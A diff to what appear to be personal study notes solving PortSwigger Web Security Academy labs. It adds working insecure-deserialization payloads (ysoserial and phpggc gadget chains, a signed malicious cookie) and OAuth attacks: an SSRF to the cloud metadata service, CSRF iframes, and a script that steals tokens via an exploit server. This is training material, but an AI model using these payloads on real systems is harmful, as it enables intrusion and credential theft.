@@ -726,7 +726,34 @@ GET /js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
 ## Insecure deserialization
 ### Notes
 ### Labs
-- Coming Soon
+```sh
+# Modifying serialized objects
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+# Modifying serialized data types
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+# Using application functionality to exploit insecure deserialization
+O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"thnj3h2rbkijlpa22p5fvwbxx5nnuja9";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+# Arbitrary object injection in PHP
+GET /libs/CustomTemplate.php~ HTTP/2
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+# Exploiting Java deserialization with Apache Commons
+java \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'
+# Exploiting PHP deserialization with a pre-built gadget chain (modify cookie to cause error then the site will leak /cgi-bin/phpinfo.php as a comment from dev)
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'
+<?php
+$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
+$secretKey = "5dm5ljp9ig4d3m9bisplj4vb6vqblkfo";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+# Exploiting Ruby deserialization using a documented gadget chain
+ruby exploit.rb | tr -d '\n'
+```
+- exploit.rb can be found [here](/assets/solutions/portswigger/exploit.rb).
 
 ## Information disclosure
 ### Notes
@@ -765,8 +792,55 @@ Host: 192.168.0.1
 ## OAuth authentication
 ### Notes
 ### Labs
-```txt
+```sh
+# Authentication bypass via OAuth implicit flow
+POST /authenticate HTTP/2
+{"email":"carlos@carlos-montoya.net","username":"wiener","token":"miR5GiT6WGlwfx-a1ybNznJuq0FFxrVdDOlqj4OHx2C"}
+# SSRF via OpenID dynamic client registration
+GET /.well-known/openid-configuration HTTP/2 #will see that there a /reg enpoint
+POST /reg HTTP/2
+Host: oauth-0a0700b603eb776080a11af9026c00ae.oauth-server.net
+Content-Type: application/json
+Content-Length: 160
 
+{
+    "redirect_uris" : [
+        "https://example.com"
+    ],
+    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}  # observe that register application is available, then try to add logo_uri to do SSRF
+"client_id":"qwjOPc9j3EIi49oiKQ5BL" # server will response with this client_id then we can copy this id and send it to /client
+GET /client/qwjOPc9j3EIi49oiKQ5BL/logo HTTP/2 # req
+{
+  "Code" : "Success",
+  "LastUpdated" : "2026-09-09T05:33:59.253232909Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "MPQATQkxbrEHOVwWDOwR",
+  "SecretAccessKey" : "uEUQYzAv8wooKRlePSGRzuyYU5TdmaJs0oxgbWnc",
+  "Token" : "dmpuAD36zNpV4KfXesudJfoeMMCa5esNMMF9Ivifh8teGRX42wSJM8FwO3em1A2FzWsBf9R3xi6Bdc5MMROboAlbBWMQQfzwldkLCX91pLcV7hLXyvJV4pn5iv7r0vuiIlciPG3U8bux1rxZJrjNYtt9r2XOzZQAq4FwtICHUwWAnDZIsH6BxEr2xLIkajfpt31xfPA6yQe4NtICQybR1WNgdL5L0lvf9WnXOY2gipKPqNchXhcLD9Pba3V1VAOk",
+  "Expiration" : "2032-09-07T05:33:59.253232909Z"
+} # response
+# Forced OAuth profile linking
+<iframe src="https://0acb00db04309a4b809f583200780056.web-security-academy.net/oauth-linking?code=7Su2ooBq5rOK4UzIfFa1uwV0lurzUBoJYQNEINsmG_1"></iframe>
+# OAuth account hijacking via redirect_uri
+<iframe src="https://oauth-0ab800d903dd734f817f3292024300de.oauth-server.net/auth?client_id=cq63dfc72ilu6z1tzxkay&redirect_uri=https://exploit-0a0c0049039273c981f4330701d30066.exploit-server.net/&response_type=code&scope=openid%20profile%20email"></iframe>
+# Stealing OAuth access tokens via an open redirect
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0acd007c037e7245803342d002bb00ff.oauth-server.net/auth?client_id=pdhrbbd3415p8r2slitub&redirect_uri=https://0aad005403e372d080f344bc00d600ff.web-security-academy.net/oauth-callback/../post/next?path=https%3A%2F%2Fexploit-0a9000c7031872c280d3434201b00035.exploit-server.net%2Fexploit&response_type=token&nonce=1215499351&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+# Explain: first do path traversal to redirect to next post path which has open redirection vuln, then use this next post path to redirect to our exploit server containing this script. This script is use to extract stolen access key. Finally, you can use the stolen token to access victim's account to grap api key by request to /me with Authorization: Bearer 8QH-GDDxJyhvd9vZIvSIIGUI8gfoC0vu8xQtipKoC3k.
+- req
+GET /me HTTP/2
+Host: oauth-0acd007c037e7245803342d002bb00ff.oauth-server.net
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer 8QH-GDDxJyhvd9vZIvSIIGUI8gfoC0vu8xQtipKoC3k
+
+- response
+{"sub":"administrator","apikey":"jvdbM4FS0pD6trh8AUhoFigSquCjiedF","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
 ```
 
 ## File upload vulnerabilities
